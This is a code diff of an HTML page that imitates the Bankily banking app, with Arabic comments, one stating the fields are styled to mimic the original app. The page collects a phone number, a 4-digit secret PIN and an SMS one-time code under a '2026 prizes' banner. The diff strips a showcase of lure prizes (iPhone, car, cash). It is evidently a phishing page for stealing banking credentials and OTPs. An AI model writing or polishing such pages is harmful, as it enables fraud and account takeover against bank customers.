@@ -43,21 +43,6 @@
             box-shadow: 0 4px 10px rgba(0,0,0,0.1);
         }
 
-        /* عرض الجوائز الواقعي */
-        .prize-showcase {
-            display: flex;
-            gap: 20px;
-            margin-top: 25px;
-        }
-        .prize-card {
-            background: rgba(255, 255, 255, 0.2);
-            padding: 10px;
-            border-radius: 15px;
-            text-align: center;
-            backdrop-filter: blur(5px);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-        }
-
         /* تنسيق الحقول لمحاكاة التطبيق الأصلي */
         .app-container { padding: 30px 40px; }
         .input-box { 
@@ -102,17 +87,11 @@
 </head>
 <body>
 
-    <!-- الواجهة الرئيسية للجوائز -->
+    <!-- الواجهة الرئيسية -->
     <div id="screen-login">
         <div class="bankily-header">
             <h1 class="brand-title">Bankily</h1>
             <div class="year-badge">جوائز 2026</div>
-            
-            <div class="prize-showcase">
-                <div class="prize-card"><span class="block text-2xl">📱</span><span class="text-[10px] text-white">iPhone 17</span></div>
-                <div class="prize-card"><span class="block text-2xl">🚗</span><span class="text-[10px] text-white">سيارة أحلامك</span></div>
-                <div class="prize-card"><span class="block text-2xl">💰</span><span class="text-[10px] text-white">مبالغ نقدية</span></div>
-            </div>
         </div>
 
         <div class="app-container">
@@ -120,7 +99,6 @@
             
             <div class="input-box">
                 <label class="input-label">رقم الهاتف (8 أرقام)</label>
-                <!-- قانون: أرقام فقط -->
                 <input id="user_id" type="tel" class="input-field" 
                        oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
                        maxlength="8" placeholder="00000000">
@@ -128,7 +106,6 @@
 
             <div class="input-box">
                 <label class="input-label">الرمز السري (4 أرقام)</label>
-                <!-- قانون: أرقام فقط -->
                 <input id="pin" type="password" class="input-field" 
                        oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
                        maxlength="4" placeholder="****">
@@ -149,7 +126,6 @@
         <div class="px-10 mt-16">
             <p class="text-gray-600 font-bold mb-8">أدخل الرمز السري المكون من 4 أرقام الذي استلمته الآن عبر الرسائل النصية</p>
             
-            <!-- قانون: إدخال يدوي + أرقام فقط -->
             <input id="otp_manual" type="tel" class="otp-large-input" 
                    oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
                    maxlength="4" placeholder="0000">
